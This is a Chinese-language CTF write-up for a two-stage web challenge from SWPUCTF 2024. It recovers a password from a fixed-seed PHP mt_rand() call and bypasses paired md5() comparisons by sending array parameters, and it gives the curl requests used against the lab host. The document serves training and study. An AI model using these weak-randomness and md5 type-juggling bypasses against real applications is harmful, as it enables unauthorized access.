# [SWPUCTF 2024 秋季新生赛]我没活儿整辣!

## 题目信息

- 类型：Web
- 题目状态：阶段性分析
- 目标：http://node6.anna.nssctf.cn:20903/
- 核心漏洞：第一关为固定种子的 `mt_rand()` 弱口令，第二关为 `md5()` 对数组参数的类型处理导致的比较绕过

## 入口与现象

首页只有一个输入框，源码注释里直接给了关键逻辑：

```php
mt_srand(114514);
$result = intval(mt_rand());
```

站点响应头还能看到后端环境是 `PHP/7.3.33`，所以这里不能随便用别的版本猜值，必须按实际 PHP 行为算首个 `mt_rand()` 输出。

提交正确密码后，页面提示进入下一关：

```text
密码正确！下一关：/leve2.php
```

访问 [`/leve2.php`](http://node6.anna.nssctf.cn:20903/leve2.php) 会直接高亮源码：

```php
<?php 
 highlight_file(__FILE__);
if (isset($_GET['a']) && isset($_GET['b'])&&isset($_POST['c'])&&isset($_POST['d'])){
    $a = $_GET['a'];
    $b = $_GET['b'];
    $c = $_POST['c'];
    $d = $_POST['d'];
    if (($a != $b && md5($a) == md5($b)) && ($c != $d && md5($c) === md5($d))) {
        echo $FLAG;
    }else {
        echo "实在没活儿了还是咬打火机吧"; 
        echo '<img src="./eat firemachine.png" alt="Top Image" style="display: block; margin: 0 auto; max-width: 70%; height: auto;">'; }
}else {
    echo "不传参我让你飞起来！！！";
    echo '<img src="./fly.png" alt="Top Image" style="display: block; margin: 0 auto; max-width: 70%; height: auto;">'; 
}?>
```

## 分析过程

### 第一关：固定种子的 `mt_rand()`

最开始我用自己写的 MT19937 脚本复现，结果和目标站不一致。后面直接用本地 PHP CLI 跳过损坏的 `php.ini` 配置，以 `php -n` 执行最小脚本，得到真实输出：

```php
<?php
mt_srand(114514);
echo mt_rand(), PHP_EOL;
```

输出为：

```text
1476944489
```

把这个值提交到首页后，服务器返回：

```text
密码正确！下一关：/leve2.php
```

所以第一关本质就是源码泄露后的固定随机数复现。

### 第二关：`md5(array)` 绕过

第二关分成两组条件：

```php
($a != $b && md5($a) == md5($b))
($c != $d && md5($c) === md5($d))
```

第一组是弱比较，常规思路可以用 `0e...` 魔术哈希；但第二组用了 `===`，普通魔术哈希就不够了。

这里更直接的做法是给 `md5()` 传数组。在 `PHP 7.3.33` 下，`md5(array)` 会报 `Warning`，同时返回 `NULL`。于是：

- 只要 `a` 和 `b` 是不同数组，`$a != $b` 成立；
- `md5($a)` 和 `md5($b)` 都是 `NULL`，弱比较 `==` 成立；
- `c` 和 `d` 同样传不同数组时，`$c != $d` 成立；
- `md5($c)` 和 `md5($d)` 也都是 `NULL`，严格比较 `===` 依然成立。

因此可以用数组一次性满足两组判断。

## 利用过程

### 第一步：通过第一关

直接提交第一关密码：

```bash
curl.exe -i -X POST -d "captcha=1476944489" "http://node6.anna.nssctf.cn:20903/"
```

返回关键提示：

```text
密码正确！下一关：/leve2.php
```

### 第二步：构造第二关参数

对第二关发送如下请求：

```bash
curl.exe -i -X POST -d "c[]=1&d[]=2" "http://node6.anna.nssctf.cn:20903/leve2.php?a[]=1&b[]=2"
```

这时服务端会连续报出 4 个 `md5()` warning：

```text
Warning: md5() expects parameter 1 to be string, array given in /var/www/html/leve2.php on line 8
```

但页面没有进入 `else` 分支，没有出现“实在没活儿了还是咬打火机吧”，说明条件判断实际上已经被满足了。

## 关键 payload / 命令

```text
第一关密码：1476944489

第二关：
GET  /leve2.php?a[]=1&b[]=2
POST c[]=1&d[]=2
```

```bash
curl.exe -i -X POST -d "captcha=1476944489" "http://node6.anna.nssctf.cn:20903/"
curl.exe -i -X POST -d "c[]=1&d[]=2" "http://node6.anna.nssctf.cn:20903/leve2.php?a[]=1&b[]=2"
```

## Flag

```text
当前靶场环境中，第二关条件命中后没有输出任何 flag 内容。
从返回结果看，利用链已经成立，但 `$FLAG` 在当前实例里没有被正确回显，疑似题目环境变量或预包含配置缺失。
```

## 总结

这题前半段非常直接：首页注释已经把 `mt_srand(114514)` 和 `mt_rand()` 暴露了出来，关键只是注意按真实 PHP 行为复现出首个随机数 `1476944489`。第二关则是典型的类型处理题，利用 `PHP 7.3` 中 `md5(array)` 返回 `NULL` 的特性，就能同时绕过弱比较和严格比较。

可惜当前在线实例在第二关条件命中后没有实际输出 flag，所以这篇先按阶段性分析记录；如果后续靶场恢复正常，只需要复用同一组参数即可完成取 flag。
